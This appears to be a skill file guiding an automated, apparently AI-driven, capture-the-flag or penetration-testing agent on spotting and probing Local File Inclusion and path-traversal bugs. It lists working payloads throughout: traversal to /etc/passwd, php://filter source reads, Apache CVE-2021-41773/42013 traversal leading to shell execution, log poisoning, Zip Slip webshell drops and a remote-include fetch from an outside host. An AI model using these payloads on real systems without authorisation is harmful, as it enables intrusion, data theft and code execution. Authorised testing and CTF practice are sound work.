# lfi ‚Äî when to use

Local File Inclusion / path traversal: a request handler takes a *file name or path* from the client and uses it to open, include, render, or stream a file on the server. Fire on the **shape of the reference** ‚Äî a client-controlled value that selects a file ‚Äî and fire it as a dedicated lane, the moment recon shows it, even before any traversal is attempted. Do not let a generic sqli/auth/info-disclosure agent absorb a textbook `?page=`/`?file=` surface.

## Trigger signals (dispatch this skill the moment you observe‚Ä¶)

- **A query/body/cookie parameter whose value is a file path, file name, or extension.** `?filename=css/bootstrap.min.css`, `?file=login.php`, `?page=index.php`, `?view=source`, `?path=/var/www/html/login.php`, `page=about`, `template=default.tpl`, `lang=en`, `doc=invoice`, `include=header`, `theme=dark`, `?load=`, `?doc=`. If changing the value changes *which file's bytes come back*, LFI/path-traversal applies. Highest-value tell; almost always visible in the page's own HTML or the first recon sweep.
- **A value that ends in or contains a file extension** (`.php`, `.html`, `.tpl`, `.inc`, `.log`, `.xml`, `.pdf`, `.txt`) passed back into the app via a parameter ‚Üí strong file-inclusion candidate.
- **A `?id=<slug>.php` route that renders a "post" / "page".** A blog/article viewer like `post.php?id=The-Importance-of-Cybersecurity.php` is a PHP `include($_GET['id'])` sink ("poison inclusion"). The `.php` literally appearing in an `id` value is the dynamic-include fingerprint.
- **A page that swaps content based on a parameter** (same URL skeleton, different body chunk per value of `page=`/`section=`/`module=`/`action=`) ‚Äî a poor-man's router that loads a fragment by name from disk.
- **A path segment served back as a static file by name.** `/resource?filename=<x>`, `/static/<name>`, `/download/<name>`, `/img/<name>` where requesting a known asset (`css/bootstrap.min.css`, `js/bundle.js`) returns its raw bytes ‚Üí the handler reads a file off disk by a name you control ‚Üí traversal to `../static/flag`, `../../etc/passwd` is next.
- **A download/export/preview/attachment endpoint** that takes the filename in the URL: `/download?f=...`, `/export?file=...`, `/getImage?path=...`, `Content-Disposition: attachment; filename="<your input>"` ‚Üí file-serving sink, test traversal here.
- **`.php` (or another extension) auto-appended to your input** ‚Äî you send `?page=foo` and the error/behaviour mentions `foo.php`, so `?id=flag` opens `flag.php`. Classic PHP LFI shape; strip it with a wrapper.
- **A PHP/Java/.NET/Node error that leaks a real filesystem path:** `Warning: include(...): failed to open stream`, `include(): Failed opening`, `fopen(...): No such file`, `java.io.FileNotFoundException`, `System.IO.FileNotFoundException: Could not find file 'C:\...'`, `ENOENT: no such file or directory, open '...'`. A file-not-found error keyed off *your* string = a file sink. Dispatch immediately.
- **`Server: Apache/2.4.49` or `Apache/2.4.50` in the response banner** (CVE-2021-41773 / CVE-2021-42013). If a `/cgi-bin/` (or `/icons/`) prefix exists, `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` traversal ‚Üí file read (and often RCE via mod_cgi) is in scope. The banner is the whole tell; no app logic needed. `/cgi-bin/` returning 200, 403, or 500 on a `.%2e/`-encoded traversal is the CVE firing.
- **A static file server / reverse-proxy fingerprint** (`Server: nginx`, `Server: Apache`) fronting an app, especially with `/static/`, `/assets/`, `/files/` prefixes ‚Üí test for `alias`/`..;` normalization escapes.
- **An upload-then-extract / import feature** (upload `.zip`/`.tar`/`.tgz`/`.7z`, "Import backup", "Restore", "Bulk upload") ‚Üí Zip Slip *write* surface.
- **`/proc/self/environ`, `/proc/self/cmdline`, log paths, or session files** become readable through a parameter ‚Üí LFI confirmed, escalate.
- **A traversal probe changes the response** ‚Äî `../../etc/hosts` returns hostname-mapping text, or depth changes flip between 200-with-content and 404/500 ‚Üí confirmed read primitive.
- **A 403 "Forbidden" / "Hacker detected" / "Invalid" returned specifically when you add `../` or `/etc/passwd`** to an otherwise-working file parameter. The filter that blocks traversal *confirms* the parameter is a file path (protected LFI) and escalates to a bypass.
- **OS-unknown black-box.** When you don't yet know Linux vs Windows, this is the right move ‚Äî it carries both path families (`/etc/passwd` vs `C:\Windows\win.ini`) and both separator styles.

## Use-case scenarios

- **Dynamic content routers.** Legacy/CMS apps that `include` a server-side file chosen by `?page=`/`?module=`/`?action=`/`?p=`. The fragment is loaded by name from disk; any traversal or wrapper escaping the intended directory is in scope. The canonical LFI surface, most common on older PHP stacks. After a login (often default creds) an "admin panel" that pulls sub-pages by name (`?page=`/`?view=`) is the same surface ‚Äî probes: `?page=../../../../etc/passwd`, `?view=source`, `?page=../admin/index.php`. Fire LFI here; do not assume sqli/auth.
- **File-serving endpoints.** Download/preview/thumbnail/report endpoints that name a file and stream the bytes back. Pure *read* primitive ‚Äî `/etc/passwd`, `.env`, `web.config`, app source, SSH keys, cloud-credential files. The win is often not a system file but a *flag file next to the served assets*: try `../static/flag`, `css/../flag`, `../../static/flag` before reaching for `/etc/passwd`.
- **PHP blog / article viewers ("poison inclusion").** `post.php?id=<slug>.php` includes a file. Three escalating sub-cases: (a) **plain LFI** ‚Äî read `/FLAG.php` or a log/upload you poisoned; (b) **protected LFI** ‚Äî a filter strips/blocks `../`, so use `php://filter/convert.base64-encode/resource=FLAG.php` to exfiltrate source, double-encode `%252e%252e`, or `....//`; (c) **fortified LFI + file upload** ‚Äî bypass requires uploading a poisoned file and including it; pair with `arbitrary_file_upload`. Reach for `php://filter` immediately to read PHP source ‚Äî a plain include returns rendered output, not the secret-bearing source.
- **Apache CVE path traversal (2.4.49 / 2.4.50).** Banner alone routes here. Use the `.%2e/`-encoded `/cgi-bin/...` traversal to read `/etc/passwd`, the flag, or ‚Äî because mod_cgi is enabled ‚Äî pipe into `/bin/sh` for RCE. Co-dispatch with the RCE/CVE skill.
- **Template/theme/locale selection.** `template=`, `theme=`, `skin=`, `lang=`, `locale=`, `name=<template>.html` resolving to a file on disk (`templates/<name>.tpl`, `lang/<name>.php`). User-controlled template resolution is both an LFI read surface and an **SSTI bridge** ‚Äî include an attacker-named template, then place `{{7*7}}` inside it. Dispatch LFI and SSTI together for "include a template" surfaces.
- **Document/asset pipelines.** Image renderers, PDF/office converters, thumbnailers, report engines that accept a path or source filename. They often run with broad filesystem access and join user input into a path with no normalization.
- **Reverse-proxy / static-handler boundaries.** Where nginx/Apache/CDN sits in front of the app, the layers disagree about decoding and normalization. The `alias`-without-trailing-slash bug and the `..;/` (semicolon path-segment) trick let `../` escape the served root. Probe whenever a static prefix is present.
- **Archive extraction / restore (Zip Slip *write*).** Any feature unpacking a user-supplied `.zip`/`.tar`/`.tgz`/`.7z` ‚Äî entries containing `../` or absolute paths land outside the extraction dir (overwrite a template, drop a webshell into a served dir).
- **RFI bridges.** Older PHP with `allow_url_include`/`allow_url_fopen`, or custom fetchers that include/eval a remote resource, turn a file parameter into RCE. Tell: a `http://`/`ftp://` value produces a fetch (confirm with an OAST listener).

## Concrete tells (request ‚Üí response examples)

- **Baseline Unix read confirm.** `GET /index.php?page=../../../../etc/passwd` ‚Üí body contains `root:x:0:0:root:/root:/bin/bash` (any `name:x:UID:GID:...:/path:/shell` line).
- **Windows variant when Unix fails.** `GET /view?file=..\..\..\..\Windows\win.ini` ‚Üí body contains `[fonts]` / `[extensions]` / `for 16-bit app support`.
- **File-server traversal.** Homepage HTML carries `<link href="/resource?filename=css/bootstrap.min.css">`; requesting it returns the real CSS bytes (200) ‚Üí handler reads a file by name. Sweep `filename=` over `flag`, `static/flag`, `../static/flag`, `../../etc/passwd`, encoded `%2e%2e/...` variants until one returns `200` with `FLAG{‚Ä¶}` in the body. A 200 returning a file you should not be able to name = confirmed.
- **PHP source disclosure via wrapper.** `GET /index.php?page=php://filter/convert.base64-encode/resource=index` (or `?id=php://filter/convert.base64-encode/resource=index.php`) ‚Üí a long base64 blob decoding to `<?php ...`. Confirms LFI with wrapper support and exposes source secrets a rendered include hides.
- **Auto-appended extension tell.** `?page=foo` ‚Üí error `failed to open stream: ... foo.php`. Then `?page=php://filter/.../resource=config` reads `config.php`. The appended `.php` is the fingerprint.
- **Depth/normalization probe.** `?file=../../etc/hosts` vs `?file=etc/hosts` ‚Üí former returns the hosts table, latter 404/empty. The *difference between in-root and out-of-root* is the proof, not the content alone.
- **Apache 2.4.50 CVE.** Header `Server: Apache/2.4.50 (Unix)`; `/cgi-bin/` ‚Üí 200. `GET --path-as-is /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` returns `root:x:0:0:` (and `/bin/sh` variants give command output). Banner + cgi-bin is the whole tell.
- **Apache 2.4.49 CVE.** Header `Server: Apache/2.4.49 (Unix)`; `/cgi-bin/` ‚Üí 403. `GET --path-as-is /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` returns `500` (traversal hits the CGI handler) ‚Üí escalate to mod_cgi RCE.
- **Encoding-bypass tell.** Plain `../` filtered ("invalid path") but `%2e%2e%2f`, `..%252f`, `....//`, or `..%c0%af` succeeds ‚Üí input filtered pre-decode and the WAF/router and file API decode differently. Confirms an exploitable normalization gap.
- **Protected-LFI filter signal.** `post.php?id=ScriptKiddie.php` works normally; adding `../` or `/etc/passwd` yields `403 Forbidden` / "Invalid" / "Hacker" / "not allowed" responses. The block *is* the confirmation that `id` is a file path ‚Äî pivot to encoding/`php://filter`/`....//` bypasses.
- **Proxy alias escape.** `GET /static../etc/passwd` or `GET /assets/..;/..;/..;/etc/passwd` returns file content on an nginx box ‚Üí `alias`/`..;` misconfiguration.
- **Log-poisoning escalation.** Read `/var/log/apache2/access.log` via the param; send a request with `User-Agent: <?php echo 'INJECT-OK'; ?>`; re-reading the log now renders `INJECT-OK` ‚Üí LFI-to-RCE confirmed.
- **Zip Slip tell.** Upload an archive with an entry named `../../../../var/www/html/marker.txt`; afterward `GET /marker.txt` returns your marker ‚Üí write-outside-root confirmed.
- **RFI tell.** `?page=http://<your-oast-host>/p.txt` ‚Üí your OAST listener logs an inbound fetch from the target ‚Üí remote include reachable.

## When NOT to use it / easily-confused-with

- **Reflected/echoed value, no file load ‚Üí XSS, not LFI.** If input only comes back in HTML/JS/attributes and is not used as a path, it is XSS. Discriminator: did I get file *contents* back, or my own input?
- **Value evaluated as an expression ‚Üí SSTI, not LFI.** If `name={{7*7}}` returns `49`, a template engine is rendering it. Note the overlap: a user-controlled *template name* loading `<name>.tpl` is LFI; a user-controlled *template body/expression* is SSTI. For "include a template" parameters, co-dispatch both rather than treating it as pure file read.
- **URL/host parameter fetching a remote resource server-side ‚Üí SSRF first.** `?url=`, `?target=`, `?fetch=`, `?callback=`, `?webhook=`, `?proxy=` pointing at `http://` and used for an outbound request is SSRF; it only becomes RFI when the fetched content is *included/evaluated* as code. They share param names like `path`/`resource`, so check the value shape: `http://‚Ä¶` ‚Üí SSRF, `../`/`/etc/...`/`*.php` ‚Üí LFI.
- **Value selects which database record is returned ‚Üí sqli or idor, not LFI.** `?id=5` showing record 5, `?id=1'` causing a 500, points at the query layer (sqli); `?doc_id=1042` / `?file=8a3f-uuid` mapping an ID to a stored object is IDOR. Probe a file param for traversal **and** a quote, but LFI is when the id/name resolves to a *file on disk*, not a row or stored object. If `../` is treated as a literal lookup key and 404s cleanly, it is not a filesystem sink.
- **Virtual/in-app paths that never touch disk ‚Üí false positive.** A "path" routed entirely inside the framework (DB-backed pages, S3 keys with strict prefixes) is not LFI. Confirm with a canonical small read (`/etc/hosts`) and an in-root control on the *same* endpoint before claiming it.
- **OS command in the value ‚Üí command injection, not LFI.** If the parameter is concatenated into a shell command (`; id`, `$(...)`, `` `...` `` change the response), route to command injection. LFI is path resolution, not shell execution.
- **SQLi-shaped errors.** A parameter throwing `SQL syntax`/`ORA-`/`SQLSTATE` on a quote is SQL injection ‚Äî don't misread a DB error for a filesystem error.
- **Don't stop at `/etc/passwd`.** Reading it proves the vuln but is rarely the flag. Pivot to app-relative paths (`../static/flag`) and `php://filter` source reads, and persist ‚Äî landing the one specific poisoned target (e.g. `/FLAG.php`) is a depth/persistence problem once the surface is correctly recognised.
